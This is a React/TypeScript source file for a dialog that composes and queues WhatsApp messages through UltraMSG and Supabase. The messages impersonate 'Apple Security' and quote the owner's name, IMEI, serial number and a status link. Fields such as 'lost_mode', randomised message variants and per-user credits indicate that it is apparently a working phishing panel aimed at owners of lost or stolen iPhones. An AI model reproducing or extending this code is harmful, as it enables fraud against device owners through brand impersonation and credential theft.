import React, { useState, useEffect } from 'react';
import {
  Dialog, DialogContent, DialogHeader, DialogTitle,
} from '@/components/ui/dialog';
import { Button } from '@/components/ui/button';
import { Label } from '@/components/ui/label';
import { Textarea } from '@/components/ui/textarea';
import { toast } from '@/hooks/use-toast';
import { supabase } from '@/integrations/supabase/client';
import { Send, ArrowLeft, Eye, Pencil, MessageCircle } from 'lucide-react';
import WhatsAppPreview from '@/components/WhatsAppPreview';
import { generateRandomMessage } from '@/utils/messageVariations';
import { getIphoneImageUrl } from '@/utils/iphoneImages';

interface Process {
  id: string;
  client_name: string;
  country_code: string;
  phone_number: string;
  contact_type: string;
  owner_name: string | null;
  iphone_model: string;
  storage: string;
  color: string;
  imei: string;
  serial_number: string;
  url: string | null;
  lost_mode?: boolean;
  status: string;
  template_id?: string | null;
}

interface UltraMsgPreviewDialogProps {
  isOpen: boolean;
  onClose: () => void;
  process: Process | null;
  language: 'spanish' | 'english';
  onSent: () => void;
}

const UltraMsgPreviewDialog: React.FC<UltraMsgPreviewDialogProps> = ({
  isOpen, onClose, process, language, onSent,
}) => {
  const [message, setMessage] = useState('');
  const [step, setStep] = useState<'preview' | 'edit'>('preview');
  const [loading, setLoading] = useState(false);
  const [imageUrl, setImageUrl] = useState<string | null>(null);

  useEffect(() => {
    if (isOpen && process) {
      generateMessage();
      setStep('preview');
    }
  }, [isOpen, process]);

  const generateMessage = async () => {
    if (!process) return;

    const battery = Math.floor(Math.random() * 35) + 5;
    const now = new Date();
    const delayedTime = new Date(now.getTime() - 2 * 60 * 60 * 1000);
    const formatDate = (date: Date, lang: 'spanish' | 'english') => {
      return lang === 'spanish'
        ? date.toLocaleDateString('es-ES', { day: '2-digit', month: '2-digit', year: 'numeric' })
        : date.toLocaleDateString('en-US', { month: '2-digit', day: '2-digit', year: 'numeric' });
    };
    const formatTime = (date: Date) => date.toLocaleTimeString('es-ES', { hour: '2-digit', minute: '2-digit', hour12: false });

    let content: string;

    if (process.template_id) {
      const { data: template } = await supabase
        .from('message_templates')
        .select('template_content')
        .eq('id', process.template_id)
        .single();

      if (template) {
        const random = (arr: string[]) => arr[Math.floor(Math.random() * arr.length)];
        const bat = Math.floor(Math.random() * (100 - 15 + 1)) + 15;

        const customSection = template.template_content
          .replace(/\{client_name\}/g, process.client_name || '')
          .replace(/\{phone_number\}/g, process.phone_number || '')
          .replace(/\{iphone_model\}/g, process.iphone_model || '')
          .replace(/\{storage\}/g, process.storage || '')
          .replace(/\{color\}/g, process.color || '')
          .replace(/\{imei\}/g, process.imei || '')
          .replace(/\{serial_number\}/g, process.serial_number || '')
          .replace(/\{owner_name\}/g, process.owner_name || '')
          .replace(/\{url\}/g, process.url || '');

        const openings = [
          "🔐 Notificación de Seguridad de Apple",
          "🛡️ Alert de Seguridad Apple",
          "🔒 Sistema de Seguridad Apple",
        ];
        const deviceSections = [
          `👤 Propietario: ${process.owner_name || 'No especificado'}\n📱 Modelo: ${process.iphone_model}\n🎨 Color: ${process.color}\n💾 Almacenamiento: ${process.storage}\n📟 IMEI: ${process.imei}\n🔑 Serie: ${process.serial_number}\n🔋 Batería: ${bat}%`,
        ];
        const closings = ["🛡️ Apple Security – 24/7\n©️ 2025 Apple Inc."];

        content = `${random(openings)}\n\n${customSection}\n\n${random(deviceSections)}\n\n${process.url ? `🌍 Ver estado: ${process.url}` : ''}\n\n${random(closings)}`;
      } else {
        content = generateRandomMessage(process, language, battery, delayedTime, formatDate, formatTime);
      }
    } else {
      content = generateRandomMessage(process, language, battery, delayedTime, formatDate, formatTime);
    }

    setMessage(content);

    const img = getIphoneImageUrl(process.iphone_model, process.color);
    try {
      const res = await fetch(img, { method: 'HEAD' });
      setImageUrl(res.ok ? img : null);
    } catch { setImageUrl(null); }
  };

  const handleSend = async () => {
    if (!process || !message.trim()) return;
    setLoading(true);

    try {
      const { data: { user } } = await supabase.auth.getUser();
      if (!user) throw new Error('No autenticado');

      const { data: profile } = await supabase.from('profiles').select('credits').eq('id', user.id).single();
      if (!profile || profile.credits <= 0) {
        toast({ title: "Sin créditos", description: "No tienes créditos suficientes.", variant: "destructive" });
        return;
      }

      const fullPhone = `${process.country_code}${process.phone_number}`;

      const { error: queueError } = await supabase.from('message_queue').insert({
        user_id: user.id,
        process_id: process.id,
        message_content: message,
        recipient_phone: fullPhone,
        language,
        image_url: imageUrl,
        template_id: process.template_id || null,
        status: 'pending'
      });

      if (queueError) {
        const friendly = queueError.message?.includes('MAX_2_MESSAGES_PER_NUMBER')
          ? 'Límite: solo 2 mensajes pendientes por número.'
          : 'Error al agregar a la cola';
        toast({ title: 'Error', description: friendly, variant: 'destructive' });
        return;
      }

      await supabase.from('processes').update({ status: 'en cola', updated_at: new Date().toISOString() }).eq('id', process.id);

      try {
        await supabase.functions.invoke('process-message-queue', { body: { notifyAdmin: true, messageId: null } });
      } catch {}

      toast({ title: "✅ Agregado a la cola", description: `Mensaje para ${process.client_name} se enviará en ~5 min.` });
      onSent();
      onClose();
    } catch (error: any) {
      toast({ title: "Error", description: error.message || "Error al enviar.", variant: "destructive" });
    } finally { setLoading(false); }
  };

  if (!process) return null;

  return (
    <Dialog open={isOpen} onOpenChange={(open) => !open && onClose()}>
      <DialogContent
        className="sm:max-w-[520px] max-h-[90vh] overflow-y-auto glass-card border-border/50"
        onPointerDownOutside={(e) => e.preventDefault()}
        onInteractOutside={(e) => e.preventDefault()}
        onEscapeKeyDown={(e) => e.preventDefault()}
      >
        <DialogHeader>
          <DialogTitle className="flex items-center gap-2 text-foreground">
            <MessageCircle className="h-5 w-5 text-info" />
            WhatsApp UltraMSG
            <span className="ml-auto text-xs font-normal text-muted-foreground">
              {step === 'preview' ? 'Vista Previa' : 'Editando'}
            </span>
          </DialogTitle>
        </DialogHeader>

        {step === 'preview' ? (
          <div className="space-y-4 py-2">
            <p className="text-xs text-muted-foreground text-center">
              Así se verá el mensaje para <strong className="text-foreground">+{process.country_code}{process.phone_number}</strong>
              <span className="ml-1">({language === 'english' ? '🇺🇸 EN' : '🇪🇸 ES'})</span>
            </p>

            <WhatsAppPreview
              message={message}
              contactName={process.owner_name || process.client_name || 'Apple'}
            />

            {imageUrl && (
              <div className="text-xs text-muted-foreground text-center flex items-center justify-center gap-1.5">
                <span className="inline-block h-2 w-2 rounded-full bg-success" /> Se enviará con imagen del dispositivo
              </div>
            )}

            <div className="flex gap-2 justify-between pt-2 border-t border-border/50">
              <div className="flex gap-2">
                <Button type="button" variant="outline" onClick={onClose} className="h-9">Cancelar</Button>
                <Button type="button" variant="outline" onClick={() => setStep('edit')} className="h-9">
                  <Pencil className="mr-2 h-3.5 w-3.5" /> Editar
                </Button>
              </div>
              <Button type="button" onClick={handleSend} disabled={loading}
                className="bg-info hover:bg-info/90 text-info-foreground h-9">
                {loading ? 'Enviando...' : <><Send className="mr-2 h-4 w-4" /> Enviar a Cola</>}
              </Button>
            </div>
          </div>
        ) : (
          <div className="space-y-4 py-2">
            <div className="space-y-1.5">
              <Label className="text-muted-foreground text-sm">Editar Mensaje</Label>
              <Textarea value={message} onChange={(e) => setMessage(e.target.value)}
                className="bg-accent/50 border-border/50 min-h-[200px] text-sm font-mono" />
            </div>

            <div className="flex gap-2 justify-between pt-2 border-t border-border/50">
              <Button type="button" variant="outline" onClick={onClose} className="h-9">Cancelar</Button>
              <Button type="button" onClick={() => setStep('preview')} className="bg-info hover:bg-info/90 text-info-foreground h-9">
                <Eye className="mr-2 h-4 w-4" /> Ver Preview
              </Button>
            </div>
          </div>
        )}
      </DialogContent>
    </Dialog>
  );
};

export default UltraMsgPreviewDialog;
